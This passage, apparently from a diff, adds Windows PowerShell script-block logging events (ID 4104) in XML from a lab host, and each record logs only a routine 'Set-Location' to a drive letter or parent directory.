+      <Data Name="ScriptBlockId">a7a8ac6e-44e9-4f59-8bac-08f6723bb96c</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1295</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location B:</Data>
+      <Data Name="ScriptBlockId">d349dff4-1b33-4f74-a75d-58c338469bee</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1296</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location C:</Data>
+      <Data Name="ScriptBlockId">bba854a0-def6-46a5-8bb7-1148c2dee707</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1297</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location D:</Data>
+      <Data Name="ScriptBlockId">337c5921-1256-48f0-aa49-2d99a0c89d42</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1298</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location E:</Data>
+      <Data Name="ScriptBlockId">5ff5041a-7729-40ba-9360-4a67b66b02be</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1299</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location F:</Data>
+      <Data Name="ScriptBlockId">c09fb18f-c755-4d29-aa23-59b9e8db6f00</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1300</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location G:</Data>
+      <Data Name="ScriptBlockId">94499135-462f-4e6c-912c-9c02f1395c91</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1301</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location H:</Data>
+      <Data Name="ScriptBlockId">fc3de4d3-5288-4949-ae31-20413ae88de4</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1302</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location I:</Data>
+      <Data Name="ScriptBlockId">8557dd9a-4938-44c8-8c90-1e624d9fe001</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1303</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location J:</Data>
+      <Data Name="ScriptBlockId">c5a74e47-9a83-459e-ba78-2a186f3f4b89</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1304</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location K:</Data>
+      <Data Name="ScriptBlockId">eb9be239-a0b7-47d8-9d09-f1fd8e8e308e</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1305</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location L:</Data>
+      <Data Name="ScriptBlockId">38fc7c20-6e22-4297-9603-711614fea4fb</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1306</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location M:</Data>
+      <Data Name="ScriptBlockId">96bf0226-b104-4c70-996c-e0cddc8a906d</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1307</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location N:</Data>
+      <Data Name="ScriptBlockId">f853a427-32a2-477d-86d2-e8d55a29de4b</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1308</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location O:</Data>
+      <Data Name="ScriptBlockId">34f07b98-3fa7-4c94-b23b-de4d409173dd</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1309</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location P:</Data>
+      <Data Name="ScriptBlockId">7643c353-2dd8-4588-bd19-068372f4449e</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1310</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location Q:</Data>
+      <Data Name="ScriptBlockId">bafee791-5f61-478c-b27e-fc6051f02424</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1311</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location R:</Data>
+      <Data Name="ScriptBlockId">6ae074a7-11e8-4034-94cb-0bca270db926</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1312</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location S:</Data>
+      <Data Name="ScriptBlockId">bf31dd02-765f-415c-a7be-2928165332ab</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1313</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location T:</Data>
+      <Data Name="ScriptBlockId">d5101983-d5b5-4a4b-a4c2-1e28c394c17b</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1314</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location U:</Data>
+      <Data Name="ScriptBlockId">b3436631-814a-4e9a-a9f5-f653e66afbb3</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1315</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location V:</Data>
+      <Data Name="ScriptBlockId">682fcbda-a369-44b6-964b-f807b55f4783</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1316</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location W:</Data>
+      <Data Name="ScriptBlockId">506c4b22-1250-4c1e-ba20-04bfe17784e8</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1317</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location X:</Data>
+      <Data Name="ScriptBlockId">66d0e449-6174-4689-8701-954793f4319c</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1318</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location Y:</Data>
+      <Data Name="ScriptBlockId">a1df8479-12de-4867-91d2-8adbd07329e8</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1319</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location Z:</Data>
+      <Data Name="ScriptBlockId">2bea488b-2464-494c-999e-3e03854df0e7</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1320</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location ..</Data>
+      <Data Name="ScriptBlockId">075b4a15-6529-4d7a-a310-86e866066eff</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1321</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location \</Data>
+      <Data Name="ScriptBlockId">f0d12f4c-3604-42e8-89c0-551e9edd388f</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
